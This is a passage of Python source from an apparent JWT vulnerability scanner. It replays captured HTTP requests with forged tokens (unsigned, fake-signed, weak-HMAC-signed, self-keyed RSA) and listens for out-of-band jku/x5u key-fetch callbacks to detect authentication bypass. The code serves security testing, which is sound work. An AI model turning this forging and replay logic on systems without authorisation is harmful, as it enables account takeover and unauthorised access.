                    continue
                pem = public_key_pem_from_jwk(jwk)
                if pem:
                    keys.append((f"jwks:{url}", pem))
        return keys

    def fetch_json(self, url):
        try:
            request = Request(url, method="GET", headers={"User-Agent": "pass_scan-jwt/1.0"})
            response = self.opener.open(request, timeout=4)
            body = response.read(262144)
            return json.loads(body.decode("utf-8", errors="replace"))
        except Exception:
            return None

    # ------------------------------------------------------------------
    # HTTP replay
    # ------------------------------------------------------------------

    def build_baseline(self, flow):
        clean = self.send_probe(flow, None, "")
        if clean and not clean.get("timed_out"):
            return clean
        original = self.response_from_flow(flow)
        if original:
            return original
        return None

    def response_from_flow(self, flow):
        response = getattr(flow, "response", None)
        if not response:
            return None
        body = response.content or b""
        text, _charset = decode_body_text(body, response.headers)
        return {
            "status_code": response.status_code,
            "length": len(body),
            "headers": dict(response.headers.items()),
            "text": text[:MAX_COMPARE_CHARS],
            "request_packet": "",
            "response_packet": self.build_response_packet(
                response.status_code,
                getattr(response, "reason", ""),
                response.headers,
                body,
                "utf-8",
            ),
        }

    def send_probe(self, flow, location, token_value, remove_token=False):
        request = flow.request
        method = request.method.upper()
        url, body, header_overrides, header_removals = self.build_probe_request(
            flow, location, token_value, remove_token=remove_token
        )
        host = urlsplit(url).netloc
        if self.waf_state:
            self.waf_state.wait_if_needed(host)

        headers = self.copy_headers(request.headers)
        for name in header_removals:
            self.remove_header(headers, name)
        for name, value in header_overrides.items():
            self.set_header(headers, name, value)

        data = body if method != "GET" else None
        request_packet = self.build_request_packet(method, url, headers, data)
        urllib_request = Request(url, data=data, headers=headers, method=method)

        try:
            response = self.opener.open(urllib_request, timeout=TIMEOUT)
            response_body = response.read(MAX_COMPARE_CHARS + 1)
            status_code = response.status
            reason = getattr(response, "reason", "")
            response_headers = response.headers
        except HTTPError as error:
            response_body = error.read(MAX_COMPARE_CHARS + 1)
            status_code = error.code
            reason = getattr(error, "reason", "")
            response_headers = error.headers
        except (socket.timeout, TimeoutError):
            return {
                "status_code": 0,
                "length": 0,
                "headers": {},
                "text": "",
                "timed_out": True,
                "request_packet": request_packet,
                "response_packet": "",
            }
        except (URLError, OSError, ValueError):
            return None

        charset = response_headers.get_content_charset() or "utf-8"
        text = response_body.decode(charset, errors="replace")
        response_packet = self.build_response_packet(
            status_code,
            reason,
            response_headers,
            response_body[:MAX_COMPARE_CHARS],
            charset,
        )
        return {
            "status_code": status_code,
            "length": len(response_body),
            "headers": dict(response_headers.items()),
            "text": text[:MAX_COMPARE_CHARS],
            "request_packet": request_packet,
            "response_packet": self.trim_proof(response_packet),
        }

    def build_probe_request(self, flow, location, token_value, remove_token=False):
        request = flow.request
        url = request.pretty_url
        body = request.content or b""
        header_overrides = {}
        header_removals = []
        if location is None:
            return url, body, header_overrides, header_removals

        if location.place == "header":
            if remove_token:
                header_removals.append(location.name)
            elif location.name.lower() == "authorization" and location.header_scheme:
                header_overrides[location.name] = f"{location.header_scheme} {token_value}"
            else:
                original = get_header(request.headers, location.name)
                header_overrides[location.name] = original.replace(location.value, token_value, 1) if original else token_value
            return url, body, header_overrides, header_removals

        if location.place == "cookie":
            pairs = parse_cookie_pairs(get_header(request.headers, "cookie"))
            new_pairs = []
            for index, (name, value) in enumerate(pairs):
                if index == location.index or name == location.name:
                    if remove_token:
                        continue
                    new_pairs.append((name, token_value))
                else:
                    new_pairs.append((name, value))
            header_overrides["Cookie"] = build_cookie_header(new_pairs)
            return url, body, header_overrides, header_removals

        if location.place == "query":
            url = self.replace_query_value(url, location.index, token_value if not remove_token else "")
            return url, body, header_overrides, header_removals

        if location.place == "form":
            text, _charset = decode_body_text(body, request.headers)
            pairs = parse_qsl(text, keep_blank_values=True)
            if 0 <= location.index < len(pairs):
                pairs[location.index] = (pairs[location.index][0], token_value if not remove_token else "")
            charset = location.charset or "utf-8"
            body = urlencode_pairs(pairs, charset).encode(charset, errors="replace")
            return url, body, header_overrides, header_removals

        if location.place == "json":
            body = replace_json_body_parameter(
                body,
                request.headers,
                {
                    "name": location.name,
                    "json_path": location.json_path,
                    "charset": location.charset or "utf-8",
                },
                token_value if not remove_token else "",
            )
            return url, body, header_overrides, header_removals

        return url, body, header_overrides, header_removals

    def replace_query_value(self, url, index, new_value):
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        if 0 <= index < len(pairs):
            pairs[index] = (pairs[index][0], new_value)
        return urlunsplit(
            (
                parts.scheme,
                parts.netloc,
                parts.path,
                urlencode_pairs(pairs),
                parts.fragment,
            )
        )

    def preview_request_packet(self, flow, location, token_value):
        url, body, header_overrides, header_removals = self.build_probe_request(
            flow, location, token_value
        )
        headers = self.copy_headers(flow.request.headers)
        for name in header_removals:
            self.remove_header(headers, name)
        for name, value in header_overrides.items():
            self.set_header(headers, name, value)
        data = body if flow.request.method.upper() != "GET" else None
        return self.build_request_packet(flow.request.method.upper(), url, headers, data)

    def response_accepted(self, probe):
        status = int(probe.get("status_code") or 0)
        if status <= 0 or status in (401, 403, 419):
            return False
        if status >= 500:
            return False
        text = (probe.get("text") or "").lower()
        return not any(keyword in text for keyword in AUTH_FAILURE_KEYWORDS)

    def response_accepted_like(self, baseline, probe):
        if not self.response_accepted(probe):
            return False
        base_status = int(baseline.get("status_code") or 0)
        probe_status = int(probe.get("status_code") or 0)
        if base_status == probe_status:
            return True
        if 200 <= base_status < 400 and 200 <= probe_status < 400:
            return True
        return False

    def probe_confirms_bypass(self, baseline, negative, probe):
        if self.response_accepted_like(baseline, negative):
            return False
        return self.response_accepted_like(baseline, probe)

    # ------------------------------------------------------------------
    # Proof/output helpers
    # ------------------------------------------------------------------

    def build_finding(
        self,
        flow,
        location,
        method,
        evidence,
        proof_probe=None,
        severity="",
    ):
        request = getattr(flow, "request", None)
        finding = {
            "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "type": "jwt",
            "method": method,
            "request_method": getattr(request, "method", ""),
            "url": getattr(request, "pretty_url", ""),
            "param_place": location.place,
            "param_name": location.name,
            "evidence": evidence,
            "proof": self.probe_to_proof(proof_probe),
            "extra_proofs": [],
        }
        if severity:
            finding["severity"] = severity
        if evidence.get("severity"):
            finding["severity"] = evidence["severity"]
        return finding

    def weak_secret_finding(self, flow, target, secret):
        evidence = {
            "technique": "弱 HMAC 密钥",
            "message": "JWT signature verifies with a common weak HMAC secret",
            "jwt_alg": target.token.alg,
            "jwt_kid": target.token.kid,
            "jwt_secret": redact_secret(secret),
            "jwt_claims": self.safe_claim_summary(target.token.payload),
            "confidence": "high",
        }
        return self.build_finding(
            flow,
            target.location,
            "jwt_weak_secret",
            evidence,
            proof_probe=self.passive_proof(flow),
        )

    def passive_proof(self, flow):
        if not flow:
            return {"request": "", "response": ""}
        request = getattr(flow, "request", None)
        response = getattr(flow, "response", None)
        request_text = ""
        response_text = ""
        if request:
            request_text = self.build_request_packet(
                request.method.upper(),
                request.pretty_url,
                self.copy_headers(request.headers),
                request.content or b"",
            )
        if response:
            response_text = self.build_response_packet(
                response.status_code,
                getattr(response, "reason", ""),
                response.headers,
                response.content or b"",
                "utf-8",
            )
        return {"request": self.trim_proof(request_text), "response": self.trim_proof(response_text)}

    def probe_to_proof(self, probe):
        if not probe:
            return {"request": "", "response": ""}
        if "request" in probe or "response" in probe:
            return {
                "request": self.trim_proof(probe.get("request", "")),
                "response": self.trim_proof(probe.get("response", "")),
            }
        return {
            "request": self.trim_proof(probe.get("request_packet", "")),
            "response": self.trim_proof(probe.get("response_packet", "")),
        }

    def write_finding_once(self, finding):
        key = self.finding_key(finding)
        with self.lock:
            if key in self.reported:
                return False
            self.reported.add(key)
        write_jsonl(self.vuln_file, finding)
        print_finding_once(self, finding)
        if self.on_finding:
            self.on_finding(finding)
        try:
            write_html_report(self.vuln_file, self.report_file)
        except Exception:
            pass
        print_finding_once(self, finding)
        return True

    def finding_key(self, finding):
        evidence = finding.get("evidence", {}) or {}
        return (
            finding.get("method", ""),
            finding.get("url", ""),
            finding.get("param_place", ""),
            finding.get("param_name", ""),
            evidence.get("technique", ""),
            evidence.get("jwt_kid", ""),
            evidence.get("jwt_secret", ""),
            json.dumps(evidence.get("jwt_sensitive_claims", ""), ensure_ascii=False, sort_keys=True),
            json.dumps(evidence.get("jwt_exposure", ""), ensure_ascii=False, sort_keys=True),
        )

    def print_finding(self, finding):
        method = finding.get("method", "")
        label = JWT_METHOD_LABELS.get(method, method)
        print(
            red(
                "[漏洞] "
                f"检测到{label} | "
                f"{finding.get('param_place', '')}.{finding.get('param_name', '')} | "
                f"地址: {finding.get('url', '')} | 报告: {self.report_file}"
            ),
            flush=True,
        )

    def safe_claim_summary(self, payload):
        summary = {}
        for key in ("iss", "sub", "aud", "exp", "nbf", "iat", "jti", "typ", "azp", "client_id"):
            if key in payload:
                summary[key] = redact_value(payload.get(key))
        for key in PRIVILEGE_CLAIMS:
            if key in payload:
                summary[key] = redact_value(payload.get(key))
        if not summary:
            summary["keys"] = sorted(str(key) for key in payload.keys())[:20]
        return summary

    def corrupt_signature_token(self, token):
        if not token.is_jws:
            return token.raw
        signature = bytearray(token.signature or b"\x00")
        signature[0] ^= 0x01
        return f"{token.header_segment}.{token.payload_segment}.{b64url_encode(bytes(signature))}"

    def copy_headers(self, headers):
        copied = {}
        for name, value in (headers or {}).items():
            if name.lower() in HOP_BY_HOP_HEADERS:
                continue
            copied[name] = value
        copied["Accept-Encoding"] = "identity"
        return copied

    def set_header(self, headers, name, value):
        for old_name in list(headers.keys()):
            if old_name.lower() == name.lower():
                del headers[old_name]
        headers[name] = value

    def remove_header(self, headers, name):
        for old_name in list(headers.keys()):
            if old_name.lower() == name.lower():
                del headers[old_name]

    def build_request_packet(self, method, url, headers, body):
        parts = urlsplit(url)
        path = parts.path or "/"
        if parts.query:
            path = f"{path}?{parts.query}"
        packet_headers = dict(headers or {})
        if not any(name.lower() == "host" for name in packet_headers):
            packet_headers["Host"] = parts.netloc
        if body:
            packet_headers["Content-Length"] = str(len(body))
        lines = [f"{method} {path} HTTP/1.1"]
        for name, value in packet_headers.items():
            lines.append(f"{name}: {value}")
        text = "\r\n".join(lines) + "\r\n\r\n"
        if body:
            text += body_preview(body)
        return text

    def build_response_packet(self, status_code, reason, headers, body, charset):
        status_line = f"HTTP/1.1 {status_code} {reason}".rstrip()
        lines = [status_line]
        for name, value in (headers or {}).items():
            lines.append(f"{name}: {value}")
        return "\r\n".join(lines) + "\r\n\r\n" + body_preview(body, charset)

    def trim_proof(self, text):
        if not text:
            return ""
        if len(text) <= MAX_PROOF_CHARS:
            return text
        return text[:MAX_PROOF_CHARS] + "\n... [truncated] ..."

    def normalize_path_for_dedup(self, path):
        path = path or "/"
        if path == "/":
            return path
        return path.rstrip("/") or "/"


class JWTKeyFetchOOBManager:
    """Minimal interactsh manager for JWT jku/x5u/kid key fetch callbacks."""

    def __init__(self, config=None, on_interaction=None):
        self.config = config or {}
        self.on_interaction = on_interaction
        self.enabled = False
        self.client = None
        self.lock = threading.Lock()
        self.pending = {}
        self.reported = set()
        self.poll_interval = float(self.config.get("poll_interval", 15))
        self.timeout = int(self.config.get("timeout", 15))
        configured = self.config.get("server")
        self.servers = [configured] if configured else None
        self.auth_token = self.config.get("token", "")

    def start(self):
        if not self.config.get("enabled", False):
            return False
        worker = threading.Thread(target=self._bootstrap, name="pass-scan-jwt-oob-init", daemon=True)
        worker.start()
        return True

    def _bootstrap(self):
        try:
            from tools.interactsh_client import DEFAULT_SERVERS, InteractshClient
        except Exception as error:
            print(yellow(f"[JWT-OOB] 加载 interactsh 客户端失败，OOB 不可用: {error}"), flush=True)
            return

        for server in (self.servers or list(DEFAULT_SERVERS)):
            client = InteractshClient(server=server, token=self.auth_token, timeout=self.timeout)
            if client.register():
                self.client = client
                self.enabled = True
                print(yellow(f"[JWT-OOB] 已连接 interactsh 服务: {server}"), flush=True)
                self._poll_loop()
                return
        print(yellow("[JWT-OOB] 所有 interactsh 服务器注册失败，远程密钥获取 OOB 不可用"), flush=True)

    def new_domain(self):
        if not self.enabled or not self.client:
            return None, ""
        token, host = self.client.new_domain()
        with self.lock:
            self.pending[token] = {}
        return token, host

    def record(self, token, info):
        if not token:
            return
        with self.lock:
            self.pending.setdefault(token, {}).update(info or {})

    def _poll_loop(self):
        while True:
            time.sleep(self.poll_interval)
            self.poll_once()

    def poll_once(self):
        try:
            interactions = self.client.poll()
        except Exception:
            return 0
        hits = 0
        for interaction in interactions:
            token = self.client.token_of(interaction)
            if not token:
                continue
            protocol = interaction.get("protocol", "")
            with self.lock:
                info = self.pending.get(token)
                key = (token, protocol)
                if not info or key in self.reported:
                    continue
                self.reported.add(key)
            if self.on_interaction:
                try:
                    self.on_interaction(dict(info), interaction)
                    hits += 1
                except Exception as error:
                    print(yellow(f"[JWT-OOB] 处理回连异常: {error}"), flush=True)
        return hits


HMAC_HASHES = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

RSA_HASHES = {
    "RS256": "SHA256",
    "RS384": "SHA384",
    "RS512": "SHA512",
}


def parse_jwt(raw):
    raw = str(raw or "").strip().strip("'\"`<>[]{}(),;")
    if not raw:
        return None
    segments = raw.split(".")
    if len(segments) == 3:
        try:
            header = json.loads(b64url_decode(segments[0]).decode("utf-8"))
            payload = json.loads(b64url_decode(segments[1]).decode("utf-8"))
        except Exception:
            return None
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None
        if not header.get("alg") and not header.get("typ") and not header.get("kid"):
            return None
        return ParsedJWT(
            raw=raw,
            token_type="jws",
            header=header,
            payload=payload,
            header_segment=segments[0],
            payload_segment=segments[1],
            signature_segment=segments[2],
            segments=segments,
        )
    if len(segments) == 5:
        try:
            header = json.loads(b64url_decode(segments[0]).decode("utf-8"))
        except Exception:
            return None
        if not isinstance(header, dict):
            return None
        return ParsedJWT(
            raw=raw,
            token_type="jwe",
            header=header,
            payload={},
            header_segment=segments[0],
            payload_segment="",
            signature_segment="",
            segments=segments,
        )
    return None


def looks_like_jwt(value):
    return parse_jwt(value) is not None


def b64url_decode(value):
    value = str(value or "")
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def encode_json_segment(obj):
    return b64url_encode(json.dumps(obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8"))


def encode_unsigned_token(header, payload):
    return f"{encode_json_segment(header)}.{encode_json_segment(payload)}."


def encode_token_with_fake_signature(header, payload):
    signing_input = f"{encode_json_segment(header)}.{encode_json_segment(payload)}"
    return f"{signing_input}.{b64url_encode(b'pass-scan-invalid-signature')}"


def encode_signed_token(header, payload, secret, alg):
    alg = alg.upper()
    header = dict(header)
    header["alg"] = alg
    signing_input = f"{encode_json_segment(header)}.{encode_json_segment(payload)}"
    signature = sign_hmac(signing_input.encode("ascii"), secret, alg)
    return f"{signing_input}.{b64url_encode(signature)}"


def sign_hmac(signing_input, secret, alg):
    digest = HMAC_HASHES[alg.upper()]
    return hmac.new(secret, signing_input, digest).digest()


def secret_to_bytes(secret):
    if isinstance(secret, bytes):
        return secret
    return str(secret).encode("utf-8")


def parse_cookie_pairs(cookie_header):
    pairs = []
    if not cookie_header:
        return pairs
    for item in str(cookie_header).split(";"):
        item = item.strip()
        if not item:
            continue
        if "=" in item:
            name, value = item.split("=", 1)
        else:
            name, value = item, ""
        pairs.append((name.strip(), value.strip()))
    return pairs


def build_cookie_header(pairs):
    return "; ".join(f"{name}={value}" for name, value in pairs)


def urlencode_pairs(pairs, charset="utf-8"):
    encoded = []
    for name, value in pairs:
        encoded_name = quote_plus(str(name), encoding=charset, errors="replace")
        encoded_value = quote_plus(str(value), safe="%", encoding=charset, errors="replace")
        encoded.append(f"{encoded_name}={encoded_value}")
    return "&".join(encoded)


def body_preview(body, charset="utf-8"):
    if not body:
        return ""
    body = body[:MAX_BODY_PREVIEW_BYTES]
    return body.decode(charset or "utf-8", errors="replace")


def flatten_json(value, prefix=()):
    if isinstance(value, dict):
        for key, child in value.items():
            yield from flatten_json(child, prefix + (key,))
    elif isinstance(value, list):
        for index, child in enumerate(value):
            yield from flatten_json(child, prefix + (index,))
    else:
        yield prefix, value


def redact_value(value):
    if isinstance(value, (dict, list)):
        return json.dumps(value, ensure_ascii=False)[:120]
    text = str(value)
    if len(text) <= 8:
        return text
    return f"{text[:4]}...{text[-4:]}"


def redact_secret(secret):
    if secret == "":
        return "<empty>"
    text = str(secret)
    if len(text) <= 4:
        return f"{text[:1]}***"
    return f"{text[:2]}***{text[-2:]}"


def numeric_claim(value):
    try:
        return int(value)
    except (TypeError, ValueError):
        return 0


def wrap_b64(value, width=64):
    return "\n".join(value[index:index + width] for index in range(0, len(value), width))


def crypto_available():
    try:
        import cryptography  # noqa: F401
        return True
    except Exception:
        return False


def generate_rsa_jwk():
    from cryptography.hazmat.primitives.asymmetric import rsa

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    numbers = private_key.public_key().public_numbers()
    kid = f"psjwt-{uuid.uuid4().hex[:12]}"
    jwk = {
        "kty": "RSA",
        "kid": kid,
        "use": "sig",
        "alg": "RS256",
        "n": b64url_uint(numbers.n),
        "e": b64url_uint(numbers.e),
    }
    return private_key, jwk


def b64url_uint(value):
    length = (value.bit_length() + 7) // 8
    return b64url_encode(value.to_bytes(length, "big"))


def encode_rsa_token(header, payload, private_key, alg):
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    header = dict(header)
    header["alg"] = alg
    signing_input = f"{encode_json_segment(header)}.{encode_json_segment(payload)}"
    hash_alg = getattr(hashes, RSA_HASHES.get(alg, "SHA256"))()
    signature = private_key.sign(
        signing_input.encode("ascii"),
        padding.PKCS1v15(),
        hash_alg,
    )
    return f"{signing_input}.{b64url_encode(signature)}"


def public_key_pem_from_certificate(der):
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import serialization

        cert = x509.load_der_x509_certificate(der)
        return cert.public_key().public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    except Exception:
        return b""


def public_key_pem_from_jwk(jwk):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import ec, rsa

        if jwk.get("kty") == "RSA":
            n = int.from_bytes(b64url_decode(jwk.get("n", "")), "big")
            e = int.from_bytes(b64url_decode(jwk.get("e", "")), "big")
            public_key = rsa.RSAPublicNumbers(e, n).public_key()
        elif jwk.get("kty") == "EC":
            curve_name = jwk.get("crv")
            curves = {
                "P-256": ec.SECP256R1(),
                "P-384": ec.SECP384R1(),
                "P-521": ec.SECP521R1(),
            }
            curve = curves.get(curve_name)
            if not curve:
                return b""
            x = int.from_bytes(b64url_decode(jwk.get("x", "")), "big")
            y = int.from_bytes(b64url_decode(jwk.get("y", "")), "big")
            public_key = ec.EllipticCurvePublicNumbers(x, y, curve).public_key()
        else:
            return b""
        return public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    except Exception:
        return b""
